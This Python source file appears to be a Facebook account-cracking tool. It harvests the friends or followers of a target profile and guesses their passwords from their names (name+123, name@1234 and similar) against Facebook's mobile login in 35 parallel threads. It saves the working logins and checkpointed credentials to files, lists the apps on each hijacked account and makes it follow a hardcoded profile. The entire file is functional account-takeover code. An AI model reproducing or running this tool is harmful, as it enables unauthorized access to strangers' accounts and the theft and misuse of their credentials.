
#!/usr/bin/python
# -*- coding: utf-8 -*-


import requests, re, os, random, sys
from bs4 import BeautifulSoup
from random import choice
from concurrent.futures import ThreadPoolExecutor
from time import time as mek

# data - data
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA YANG UDAH GAK PERAWAN :V
J = '\033[38;2;255;127;0;1m' # ORANGE
loop, ok, cp = [],[],[]
Option = []
data_id = None

# convert cookies to token
def convert(cookie):
	cookies = {"cookie":cookie}
	res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
		'user-agent'	:	'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
		'referer'	:	'https://www.facebook.com/',
		'host'	:	'business.facebook.com',
		'origin'	:	'https://business.facebook.com',
		'upgrade-insecure-requests'	:	'1',
		'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'	:	'max-age=0',
		'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'	:	'text/html; charset=utf-8'
	}, cookies = cookies)
	try:
		token = re.search('(EAAG\w+)',str(res.text)).group(1)
	except:
		token = "Cookies Invalid"
	finally:
		return token
		
def real_time():
	return str(mek()).split('.')[0]
		
def sesi(session,res):
	response = BeautifulSoup(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = BeautifulSoup(session.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		Option.append(i.text)
	return Option

class Main:
	
	def __init__(self,**kwargs):
		self.coki, self.token = {"cookie":kwargs['coki']}, kwargs['token']
		self.data_id = []
		self.mbasic = "https://mbasic.facebook.com"
	
	@property
	def get_my_info(self):
		r = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={self.token}",cookies=self.coki).json()
		self.name,self.id = r['name'], r['id']
		return {'name':self.name, 'id':self.id}
			
		
	@property
	def Menu(self):
		try:
			info = self.get_my_info
		except KeyError:
			os.remove("data/token");os.remove("data/coki")
			exit(" ! Your token Expired ! ")
		os.system("clear")
		print("""\x1b[1;92m
 ███▄ ▄███▓ █    ██   █████▒ █████▒██▓ ███▄    █ 
▓██▒▀█▀ ██▒ ██  ▓██▒▓██   ▒▓██   ▒▓██▒ ██ ▀█   █ 
▓██    ▓██░▓██  ▒██░▒████ ░▒████ ░▒██▒▓██  ▀█ ██▒
▒██    ▒██ ▓▓█  ░██░░▓█▒  ░░▓█▒  ░░██░▓██▒  ▐▌██▒
▒██▒   ░██▒▒▒█████▓ ░▒█░   ░▒█░   ░██░▒██░   ▓██░
░ ▒░   ░  ░░▒▓▒ ▒ ▒  ▒ ░    ▒ ░   ░▓  ░ ▒░   ▒ ▒ 
░  ░      ░░░▒░ ░ ░  ░      ░      ▒ ░░ ░░   ░ ▒░
░      ░    ░░░ ░ ░  ░ ░    ░ ░    ▒ ░   ░   ░ ░ 
       ░      ░                    ░           ░ 
                                                 
                                        

                                     
 
[\x1b[1;97m•\33[1;97m] Autor  : ADRIAN-XD \n[\x1b[1;97m•\33[1;97m] Github : ADRIAN-XD\x1b[1;97m\n---------------------------------------------------------------------""")
        

		IP = requests.get('https://api.ipify.org').text
		print('          %s[ %sWelcome To ADRIAN-XD Tool %s%s ]\n'%(N,O,N,O))
		print('%s[%s•%s] IP     : %s'%(N,O,N,IP))
		print(f"[•] Name   : {info['name']}  ")
		print(f"[•] ID     : {info['id']}")
		print ("---------------------------------------------------------------------")
		print('%s[%s1%s] CRACK ID PUBLIC'%(N,O,N))
		print('%s[%s2%s] CRACK ID FOLLOWERS'%(N,O,N))
		print('%s[%s3%s] CHECK RESULT OK/CP'%(N,O,N))
		print('%s[%s0%s] LOG OUT, DELETE TOKEN'%(N,O,N))	
		print ("---------------------------------------------------------------------")
		chose = input("Chosee: ")
		number_list = ['0','1','2','3']
		print ("---------------------------------------------------------------------")
		while chose not in number_list:
			print(' ! Your Chose Not Found !')
			chose = input(" > Chosee: ")	
		if chose=='1' or chose=='2':
			if chose=='1':print("\n --------------------------------------------------------------------- \n Turn On Airplane MOde (Flight Mode ) if no result \n ---------------------------------------------------------------------")
			else:print("\n --------------------------------------------------------------------- \n Turn On Airplane MOde (Flight Mode ) if no result \n ---------------------------------------------------------------------")
			account_target = input("Enter Target id: ")
			print ("---------------------------------------------------------------------")
			try:
				r = requests.get(f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}",cookies=self.coki).json()
				target_name = r['name']
				print(f"\nTarget name: {target_name}")
			except KeyError:
				exit(" ! Target Not Found ! ")
			if chose=='1':self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}",chose="friends")
			else:self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}",chose="followers")
			self.validate
		elif chose=='0':
			os.remove('data/token');os.remove('data/coki')
			exit(f'\n √ Logout Success, bye {self.name}')
		else:
			print('\n >< Check Results OK & CP ><')
			try:
				print(' >> OK results :')
				for x in open('data/ok','r').readlines():
					print(f' > {x}')
			except:print(' > Results 0 ')
			print(
				"","><"*25
			)
			try:
				print(' >> CP results :')
				for x in open('data/cp','r').readlines():
					print(f' > {x}')
			except:print(' > Results 0 ')
				
			
class Crack:
	
	def crack(self, user, password_list, url):
		session = requests.Session()
		for pw in password_list:
			r = BeautifulSoup(session.get(f"{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
				'Host'	:	'mbasic.facebook.com',
				'Connection'	:	'keep-alive',
				'Cache-Control'	:	'max-age=0',
				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile'	:	'?1',
				'sec-ch-ua-platform'	:	'"Android"',
				'Upgrade-Insecure-Requests'	:	'1',
				'User-Agent'	:	'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'Sec-Fetch-Site'	:	'same-origin',
				'Sec-Fetch-Mode'	:	'navigate',
				'Sec-Fetch-User'	:	'?1',
				'Sec-Fetch-Dest'	:	'document',
				'Referer'	:	'https://mbasic.facebook.com/login/device-based/',
				'Accept-Encoding'	:	'gzip, deflate',
				'Accept-Language'	:	'id-ID,id;q=0.9'
			}).text, 'html.parser')
			data = {_.get('name'):_.get('value') for _ in r.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
			data.update(
				{
					'uid':user,
					'next':'https://mbasic.facebook.com/login/save-device/',
					'flow':'login_no_pin',
					'encpass':'#PWD_BROWSER:0:{}:{}'.format(real_time(),pw)
				}
			)
			session.post(f'{url}/login/device-based/validate-password/', data=data, headers={
				'Host'	:	'mbasic.facebook.com',
				'Connection'	:	'keep-alive',
				'Content-Length'	:	'142',
				'Cache-Control'	:	'max-age=0',
				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile'	:	'?1',
				'sec-ch-ua-platform'	:	'"Android"',
				'Upgrade-Insecure-Requests'	:	'1',
				'Origin'	:	'https://mbasic.facebook.com',
				'Content-Type'	:	'application/x-www-form-urlencoded',
				'User-Agent'	:	'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'Sec-Fetch-Site'	:	'same-origin',
				'Sec-Fetch-Mode'	:	'navigate',
				'Sec-Fetch-User'	:	'?1',
				'Sec-Fetch-Dest'	:	'document',
				'Referer'	:	f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
				'Accept-Encoding'	:	'gzip, deflate, br',
				'Accept-Language'	:	'id-ID,id;q=0.9'
			})
			if "c_user" in session.cookies.get_dict():
				print('\r%s[MUFFIN-HACK-SUCESSFULL❤] %s • %s •'%(H,user,pw))
				ok.append(user+"|"+pw)
				open("data/ok","a").write(user+"|"+pw+"\n")
				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
				cek_apk(session,coki)
				self.follow_me(coki)
				sys.stdout.flush()
				break
			elif "checkpoint" in session.cookies.get_dict():
				print('\r%s[MUFFIN-DON-CHECKPOINT] %s • %s •'%(M,user,pw))
				cp.append(user+"|"+pw)
				open("data/cp","a").write(user+"|"+pw+"\n")
				h2 = {
					'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
				}
				res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
				ress = BeautifulSoup(res, 'html.parser')
				form = ress.find('form',{'method':'post'})
				data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
				data2.update({
					'email':user,
					'pass':pw
				})
				res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
				ress = BeautifulSoup(res, 'html.parser')
				if 'View the login details displayed. This you?' in str(ress.find('title').text):
					open("ua","a").write("%s|%s"%(user,pw))
					sys.stdout.write('\n%s\r ✓ Akun tap yes\n > Email: %s\n > Pass: %s\n %s'%(H,user,pw,P))
					sys.stdout.flush()
				else:
					if(len(sesi(session,res))==0):
						if 'Enter the Login Code to Continue' in str(ress.find('title').text):
							sys.stdout.write('\n%s\r × a2f account on\n > Email: %s\n > Pass: %s\n ^ Throw it away ^\n%s'%(M,user,pw,P))
							sys.stdout.flush()
					else:
						sys.stdout.write('\n%s\r × Checkpoint account\n > Email: %s\n > Pass: %s\n > Option: %s > %s\n%s'%(K,user,pw,len(Option),', '.join(Option),P))
						sys.stdout.flush()
				Option.clear()
				break
			sys.stdout.write("\r CRACKING STARTED %s/%s OK/CP:-%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")

class Assets(Main):
	
	@property
	def _password_split(self):
		print("\n >< Addtional password, separate by comma (,) >< \n >> example: qwerty,ADRIAN xd,nepal\n >! Password must be more than 6 characters\n")
		_password = input(" > Add pass: ");print("")
		return _password.split(",")

	@property
	def validate(self):
		add = input("ADDITIONAL PASSWORD [y/n] :")
		if add=="y":
			pas = self._password_split
		print(
			" >< Crack Running, (CTRL + C) to stopped ><\n"
		)
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				x = x.lower()
				namee,id = x.split('><')
				name = namee.split(" ")
				if(len(name[0])>=6):
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@']
				elif(len(name[0])<=2):
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@']
				else:
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@']
				if add=="y":
					__password_list = __password_list + pas
				kirim.submit(Crack().crack, id, __password_list, self.mbasic)
		exit(
			" [program finished] crack finished, ADRIAN-XD"
		)
	
	def dumpAccount(self,**latif_ganteng):
		global data_id
		if latif_ganteng['chose']=="friends":
			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['friends']
		else:
			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['subscribers']
		for x in r['data']:
			try:
				self.data_id.append(x['name']+"><"+x['id'])
			except KeyError:
				pass
		data_id = self.data_id
		print(
			f"TOTAL ID : {len(self.data_id)}"
		)
		self.validate
		
	def follow_me(self,coki):
		with requests.Session() as session:
			_link = BeautifulSoup(session.get(f"{self.mbasic}/Capri.ShankarXD",headers={'host':'mbasic.facebook.com','accept-language':'id-ID,id;q=0.9'},cookies={"cookie":coki}).text, 'html.parser').find('a',string='Ikuti')
			if _link:
				return session.get(f"{self.mbasic}"+_link.get('href'),cookies={"cookie":coki})

def _login():
	try:
		token = open("data/token","r").read()
		coki = open("data/coki","r").read()
		Assets(token=token,coki=coki).Menu
	except FileNotFoundError:
		try:os.mkdir("data")
		except:pass
		print("\t >< Cookies not found ><\n ! Please login first !\n")
		coki = input(" > Your cookies: ")
		token = convert(coki)
		if token=="Cookies Invalid":
			exit(" ! Maybe your cookies Invalid ! ")
		open("data/token","a").write(token)
		open("data/coki","a").write(coki)
		Success = Assets(token=token,coki=coki);Success.get_my_info;Success.follow_me(coki);Success.Menu
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
if __name__=="__main__":
	os.system(
		"clear"
	)
	_login()
